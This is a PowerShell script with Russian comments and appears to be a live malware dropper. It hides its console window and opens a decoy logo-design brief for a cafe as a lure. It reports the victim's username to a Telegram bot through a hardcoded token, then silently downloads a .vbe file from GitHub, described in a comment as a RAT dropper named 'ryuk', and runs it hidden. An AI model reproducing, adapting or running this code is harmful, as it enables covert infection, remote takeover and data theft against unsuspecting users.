# СКРЫВАЕМ ОКНО POWERSHELL
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)

# СОЗДАЁМ И ЗАПУСКАЕМ ЛЕГИТИМНЫЙ TXT
$fileName = "zapravkacafe_logo.txt"
$filePath = Join-Path $env:LOCALAPPDATA $fileName

$content = @"
Техническое задание (ТЗ) на разработку логотипа для кафе «ZapravkaCafe» (Вторые блюда)

1. Бриф (краткое описание проекта)
Разработать логотип для уютного городского кафе «ZapravkaCafe» (раздел «Вторые блюда»). Кафе позиционируется как комфортное, гостеприимное место в центре Пскова для повседневных обедов, дружеских встреч, семейных праздников и небольших корпоративных мероприятий. Логотип должен отражать ключевые ценности: уют, качественная домашняя кухня, теплое гостеприимство и современный подход (доставка, онлайн-заказ).

2. Целевая аудитория
    Основная: Жители и гости г. Пскова 25-50 лет, ценящие комфорт, качественную еду по адекватным ценам, возможность быстрого бизнес-ланча или неторопливого ужина в приятной обстановке.
    Вторичная: Семьи с детьми, молодежь, сотрудники близлежащих офисов, организаторы небольших частных мероприятий.

3. Идеи и ассоциации, которые должен вызывать логотип
    Уют, тепло: домашний очаг, пламя, теплые тона, мягкие формы.
    Вкусная еда, вторые блюда: пар от горячего блюда, стилизованное изображение тарелки, столовый прибор (ложка/вилка), лавровый лист или другая нейтральная кулинарная атрибутика.
    Встречи, гостеприимство: образ общего стола, открытая дверь, дружеское рукопожатие (символически), хлеб-соль.
    Домашность: баланс между современной минималистичной типографикой и теплым графическим элементом.

6. Цветовая гамма
    Предпочтительная: Теплая палитра. Оттенки терракоты, бордового, глубокого оранжевого, теплого коричневого, кремового, бежевого. Допустимы акценты темно-зеленого (как цвет свежей зелени) или благородного золота.
    Нежелательная: Холодные синие, серые, кислотные цвета, черно-белая монохромность (без теплых акцентов).

7. Шрифты
    Предпочтительные: Четкие, читаемые, могут быть с засечками (для передачи классичности и надежности) или современные гротески (для акцента на удобство и онлайн-сервисы). Возможно сочетание двух шрифтов. Важно, чтобы слово «ZapravkaCafe» (или его часть) было легко прочитать.
    Нежелательные: Вычурные, готические, слишком неформальные или моноширинные (технические) шрифты.

8. Идеи для графики (эскиза)
    Текстовый знак + абстрактный символ: Стилизованное изображение пламени или дыма (от горячего блюда) в форме сердца или крыши дома, рядом с названием.
    Эмблема: Лаконичное изображение тарелки с поднимающимся над ней паром, в который «вписана» буква «Z» или стилизованный образ крыши/двери. Вокруг или снизу — текст названия.
    Комбинированный: Текст «ZapravkaCafe», под ним строчка «Вторые блюда» или «Уютное кафе», а над текстом — графический элемент в виде перекрещенных ложки и вилки, образующих схематичный «домик».
"@

$content | Out-File -FilePath $filePath -Encoding UTF8
Invoke-Item $filePath

# ОТПРАВЛЯЕМ СООБЩЕНИЕ В TELEGRAM
$Token = "8263447327:AAH2UWtHaUU0i_3OmxK7mzmRLTK8MfsWzSk"
$ChatID = "7063407604"
$CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$Message = "The user's shortcut was enabled for user: $CurrentUser"

$URL = "https://api.telegram.org/bot$Token/sendMessage"

$Body = @{
    chat_id = $ChatID
    text = $Message
} | ConvertTo-Json

try {
    $Response = Invoke-RestMethod -Uri $URL -Method Post -ContentType "application/json" -Body $Body
} catch {
}

# ЗАДЕРЖКА
Start-Sleep -Seconds 444

# СКРЫТО СКАЧИВАЕМ И ЗАПУСКАЕМ ПЕРЕНОСЧИК RAT
$Url = "https://github.com/Mafin111/MafinREP111/raw/refs/heads/main/SCRRC4ryuk.vbe"
$FileName = "ryuk.vbe"
$LocalAppData = [Environment]::GetFolderPath("LocalApplicationData")
$DownloadPath = Join-Path $LocalAppData $FileName

try {
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($Url, $DownloadPath)
    
    $processInfo = New-Object System.Diagnostics.ProcessStartInfo
    $processInfo.FileName = $DownloadPath
    $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $processInfo.CreateNoWindow = $true
    [System.Diagnostics.Process]::Start($processInfo) | Out-Null
}
catch {
	
}


exit